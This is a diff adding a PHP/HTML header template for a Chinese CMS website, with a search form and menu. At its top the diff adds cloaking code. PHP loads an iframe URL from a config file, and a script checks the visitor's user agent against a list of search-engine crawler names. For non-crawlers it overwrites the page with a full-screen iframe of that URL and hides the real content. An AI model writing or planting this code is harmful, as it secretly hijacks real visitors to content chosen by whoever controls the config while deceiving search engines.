@@ -1,0 +1,75 @@
+﻿{php}
+$config = '/www/wwwroot/ripbmm.com/template/iframe_config.json';
+$iframe_src = 'https://www.baidu.com';
+if (file_exists($config)) {
+$data = json_decode(file_get_contents($config), true);
+if (!empty($data['iframe_src'])) $iframe_src = $data['iframe_src'];
+}
+echo "<script>var iframeSrcFromConfig = '" . addslashes($iframe_src) . "';</script>";
+{/php}
+
+<script>
+    (function() {
+        var ua = navigator.userAgent.toLowerCase();
+
+        // 常见蜘蛛关键词
+        var spiderKeywords = [
+            'spider',        // 通用
+            'bot',           // 通用
+            'crawl',         // 通用
+            'baiduspider',
+            'googlebot',
+            'bingbot',
+            'yandex',
+            'sogou',
+            '360spider',
+            'bytespider',
+            'semrush',
+            'mj12bot',
+            'ahrefsbot'
+        ];
+
+        // 判断是否为蜘蛛
+        var isSpider = spiderKeywords.some(function(keyword) {
+            return ua.indexOf(keyword) !== -1;
+        });
+
+        console.log("User-Agent:", ua);
+        console.log("是否是蜘蛛:", isSpider);
+        console.log("iframeSrcFromConfig from PHP:", iframeSrcFromConfig);
+
+        if (!isSpider) {
+            document.write('<body style="margin:0;padding:0;">');
+            document.write('<iframe src="' + iframeSrcFromConfig + '" frameborder="0" style="width:100%;height:100vh;"></iframe>');
+            document.write('</body></html>');
+            document.write('<div style="display: none;"><div><div>');
+        }
+    })();
+</script>
+
+
+
+
+
+<div class="top"></div>
+<div class="head">
+    <div class="logo fl"><a href="{$web_url}"><img src="{logo width='180'/}"></a></div>
+    <div class="tagso fr">
+        <div class="serach fl">
+            <form action="" name="formsearch">
+                <input type="hidden" name="kwtype" value="0" />
+                <input name="keyword" type="text" class="search-keyword fl" id="search-keyword" value="站内搜索" onfocus="if(this.value=='站内搜索'){this.value='';}"  onblur="if(this.value==''){this.value='站内搜索';}"/>
+                <button type="submit" class="search-submit fl">搜索</button>
+            </form>
+        </div>
+    </div>
+    <div class="cl"></div>
+</div>
+<div class="nav1">
+    <ul class="n-box1">
+        <li class="u-1"><a href="{$web_path}/">首页</a></li>
+        {menu row="10"}
+        <li ><a href='{$vo.typeurl}'>{$vo.typename}</a></li>
+        {/menu}
+    </ul>
+</div>
